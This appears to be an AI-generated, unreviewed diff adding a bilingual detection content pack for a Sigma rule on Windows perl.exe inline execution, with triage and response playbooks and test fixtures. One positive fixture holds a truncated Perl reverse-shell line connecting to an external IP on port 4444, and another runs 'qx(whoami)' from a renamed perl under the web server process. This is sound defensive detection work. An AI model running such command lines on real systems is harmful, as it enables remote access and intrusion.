@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "f426547a-e0f7-441a-b63e-854ac5bdf54d",
+    "title": "Perl Inline Command Execution",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_perl_inline_command_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_perl_inline_command_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó perl.exe en un host Windows con código Perl en línea mediante la opción -e o -E. Puede ser una tarea legítima de una sola línea, pero también una reverse shell o la ejecución de código sin archivo de script.",
+      "what_it_detects": "Eventos de creación de procesos en los que Image termina en \\perl.exe u OriginalFileName es perl.exe (también cubre binarios renombrados como perl5.32.1.exe) y CommandLine contiene ' -e'. Como la comparación no distingue mayúsculas y minúsculas, también coincide con -E.",
+      "why_it_matters": "La opción -e permite ejecutar código Perl directamente desde la línea de comandos, sin dejar un script en disco. Los atacantes la usan para abrir reverse shells, descargar payloads o ejecutar comandos del sistema (ATT&CK T1059, Command and Scripting Interpreter).",
+      "triage_steps": [
+        "Lee el CommandLine completo: busca IO::Socket, Socket, IPs o puertos, exec, system, qx o backticks, cmd.exe, descargas, o código ofuscado o codificado.",
+        "Revisa Image y OriginalFileName: ¿la ruta corresponde a una instalación conocida (Strawberry Perl, Git for Windows, ActivePerl) o a una carpeta temporal o de usuario?",
+        "Examina ParentImage y la cadena de procesos: llamadas desde Office, navegadores, w3wp.exe, servicios web o cmd.exe interactivo son más sospechosas que un IDE o un pipeline de compilación.",
+        "Identifica al usuario y el host. Confirma si ese usuario es desarrollador o administrador y si suele usar Perl en ese equipo.",
+        "Busca conexiones de red de perl.exe (por ejemplo, Sysmon EID 3) y procesos hijo como cmd.exe o powershell.exe en el mismo host en una ventana de +/- 15 minutos.",
+        "Busca alertas anteriores para el mismo host o usuario, y otras ejecuciones de perl.exe -e en la organización, para comparar con un patrón habitual."
+      ],
+      "false_positives": [
+        "Desarrolladores o administradores que usan comandos de una línea con perl -e para editar texto o hacer pruebas rápidas.",
+        "Scripts de compilación, Makefiles o herramientas de Git for Windows que invocan perl -e internamente.",
+        "Instaladores o herramientas de construcción (por ejemplo, compilaciones de OpenSSL) que ejecutan fragmentos de Perl en línea."
+      ],
+      "response_steps": [
+        "Verifica con el dueño del host o el usuario si la ejecución era esperada y documenta la justificación.",
+        "Si hay indicios de reverse shell o una IP externa, aísla el endpoint y bloquea la IP o el dominio de destino en el perímetro.",
+        "Termina el proceso perl.exe y sus procesos hijo solo después de capturar la línea de comandos, el árbol de procesos y las conexiones activas.",
+        "Busca persistencia (tareas programadas, servicios, claves Run) y archivos creados por la sesión. Restablece las credenciales del usuario afectado si es necesario.",
+        "Si es legítimo y recurrente, crea una exclusión acotada por ParentImage, usuario y host, nunca solo por Image."
+      ],
+      "severity_rationale": "La severidad media es adecuada porque perl -e tiene usos legítimos en entornos de desarrollo, pero en estaciones de usuario o servidores suele indicar ejecución interactiva o una reverse shell."
+    },
+    "en": {
+      "summary": "perl.exe ran on a Windows host with inline Perl code passed through the -e or -E flag. This may be a legitimate one-liner, but it may also be a reverse shell or code run without a script file.",
+      "what_it_detects": "Process creation events where Image ends with \\perl.exe or OriginalFileName is perl.exe (this also covers renamed or versioned binaries) and CommandLine contains ' -e'. Matching is case-insensitive, so -E also matches.",
+      "why_it_matters": "The -e flag runs Perl code directly from the command line, so no script is left on disk. Attackers use it for reverse shells, payload downloads or system command execution (ATT&CK T1059, Command and Scripting Interpreter).",
+      "triage_steps": [
+        "Read the full CommandLine: look for IO::Socket, Socket, IPs or ports, exec, system, qx or backticks, cmd.exe, downloads, or obfuscated or encoded code.",
+        "Check Image and OriginalFileName: is the path a known installation (Strawberry Perl, Git for Windows, ActivePerl), or is it a temp or user folder?",
+        "Examine ParentImage and the process chain. Office, browsers, w3wp.exe, web services or interactive cmd.exe are more suspicious than an IDE or a build pipeline.",
+        "Identify the user and host. Confirm whether the user is a developer or admin who normally uses Perl on that machine.",
+        "Look for network connections from perl.exe (for example Sysmon EID 3) and child processes such as cmd.exe or powershell.exe on the same host within +/- 15 minutes.",
+        "Check earlier alerts for the same host or user, and other perl.exe -e runs across the organization, to compare against a normal pattern."
+      ],
+      "false_positives": [
+        "Developers or admins running perl -e one-liners for text processing or quick tests.",
+        "Build scripts, Makefiles or Git for Windows tooling that call perl -e internally.",
+        "Installers or build tools (for example, OpenSSL builds) that run inline Perl snippets."
+      ],
+      "response_steps": [
+        "Ask the host owner or user whether the run was expected, and document the justification.",
+        "If you see signs of a reverse shell or an external IP, isolate the endpoint and block the destination IP or domain at the perimeter.",
+        "Kill perl.exe and its children only after you have captured the command line, the process tree and active connections.",
+        "Hunt for persistence (scheduled tasks, services, Run keys) and files the session dropped. Reset the user's credentials if needed.",
+        "If the activity is legitimate and recurring, add a narrow exclusion scoped by ParentImage, user and host, never by Image alone."
+      ],
+      "severity_rationale": "Medium fits because perl -e has legitimate uses in development environments, but on user workstations or servers it often points to hands-on execution or a reverse shell."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Strawberry Perl launched by cmd.exe with inline code that opens a socket to an external IP (reverse-shell pattern, truncated)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Strawberry\\perl\\bin\\perl.exe",
+          "OriginalFileName": "perl.exe",
+          "CommandLine": "\"C:\\Strawberry\\perl\\bin\\perl.exe\" -e \"use IO::Socket;$c=IO::Socket::INET->new('203.0.113.10:4444');\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c perl -e ...",
+          "CurrentDirectory": "C:\\Users\\jperez\\AppData\\Local\\Temp\\"
+        }
+      },
+      {
+        "description": "Renamed perl binary identified by OriginalFileName, using the uppercase -E flag",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-WEB-03",
+          "User": "ANDES\\svc_web",
+          "Image": "C:\\ProgramData\\tools\\p532.exe",
+          "OriginalFileName": "perl.exe",
+          "CommandLine": "C:\\ProgramData\\tools\\p532.exe -E \"say qx(whoami)\"",
+          "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+          "CurrentDirectory": "C:\\ProgramData\\tools\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "perl.exe running a script file with no -e or -E flag",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Strawberry\\perl\\bin\\perl.exe",
+          "OriginalFileName": "perl.exe",
+          "CommandLine": "\"C:\\Strawberry\\perl\\bin\\perl.exe\" C:\\scripts\\rotate_logs.pl --verbose",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      {
+        "description": "PowerShell with -EncodedCommand: the command line contains ' -e', but the image is not perl",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -NoProfile -EncodedCommand ZwBlAHQALQBkAGEAdABlAA==",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
